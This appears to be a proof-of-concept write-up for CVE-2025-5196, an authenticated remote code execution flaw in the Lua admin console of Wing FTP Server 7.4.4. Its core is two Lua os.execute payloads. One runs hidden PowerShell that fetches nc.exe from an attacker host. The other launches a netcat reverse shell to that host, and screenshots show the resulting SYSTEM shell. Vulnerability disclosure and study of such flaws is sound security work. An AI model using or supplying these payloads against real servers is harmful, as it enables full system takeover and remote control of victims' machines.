# Wing FTP Server 7.4.4 - Remote Code Execution (Authenticated) (CVE-2025-5196)
Wing FTP Server provides an administrative Lua scripting console accessible via its web interface. Authenticated administrators are able to execute arbitrary Lua code with insufficient sandboxing.

Affected Version: Wing FTP Server 7.4.4 (Windows) | Authentication Required: Yes

---

# Download & Release Notes
Until May 24, 2025, the latest version of the application provided by the vendor can be found at the following link: https://www.wftpserver.com/download.htm

Additionally, it can be noted that until the same date, there is a release note published informing that the RCE vulnerability has been fixed in version 7.4.4. The link to the release notes can be found here: https://www.wftpserver.com/serverhistory.htm
![image](https://github.com/user-attachments/assets/6c012118-50d8-4698-9378-8eef746c4708)

---

# PoC
PoC related to CVE-2025-5196 [VulDB](https://vuldb.com/?id.310279)
![image](https://github.com/user-attachments/assets/f35ef4d9-fd4a-4a5f-ab50-d1b9bf5bb3b3)

Wing FTP Server Web Interface

![image](https://github.com/user-attachments/assets/36426432-9ba6-4f00-8599-2dd9dffc876b)

![image](https://github.com/user-attachments/assets/9b316062-448d-45f5-8988-c98bbf950ce0)

The first peace of the command will download the nc.exe (netcat for Windows x86) to the path "C:\Users\usuario\Desktop\Drops". The second part will execute nc.exe 192.168.234.131 4443 -e cme.exe.
```
os.execute('powershell -NoP -NonI -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadFile(\'http://192.168.234.131:8000/nc.exe\', \'C:\\\\Users\\\\usuario\\\\Desktop\\\\Drops\\\\nc.exe\')"')
```
```
os.execute('cmd /c powershell -NoP -W Hidden -Command "Start-Process \\"C:\\Users\\usuario\\Desktop\\Drops\\nc.exe\\" -ArgumentList \\"192.168.234.131\\",\\"4443\\",\\"-e\\",\\"cmd.exe\\""')
```
![image](https://github.com/user-attachments/assets/c6aaac7b-bdca-4d1a-baaf-cc4a14c56cc7)

NT/SYSTEM Shell
![image](https://github.com/user-attachments/assets/a8efd159-0153-4304-9438-7ae3b27ce258)
